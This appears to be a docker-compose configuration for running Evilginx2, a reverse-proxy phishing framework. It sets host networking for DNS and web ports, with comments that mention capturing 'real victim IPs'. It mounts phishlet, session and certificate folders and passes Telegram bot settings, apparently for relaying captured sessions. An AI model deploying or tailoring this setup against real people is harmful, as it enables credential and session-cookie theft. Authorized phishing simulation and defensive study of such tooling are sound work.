services:
  evilginx:
    build: .
    image: evilginx2:latest
    container_name: evilginx2
    restart: unless-stopped

    # evilginx is an interactive console app
    tty: true
    stdin_open: true

    # Host networking: real victim IPs in logs, clean binds for 53/80/443.
    network_mode: host

    # If host mode is impossible, comment the line above and use:
    # ports:
    #   - "53:53/udp"
    #   - "53:53/tcp"
    #   - "80:80"
    #   - "443:443"

    environment:
      - TZ=${TZ:-UTC}
      - TG_BOT_TOKEN=${TG_BOT_TOKEN:-}
      - TG_CHAT_ID=${TG_CHAT_ID:-}

    volumes:
      - ./phishlets:/app/phishlets
      - ./sessions:/app/sessions
      - ./certs:/app/certs
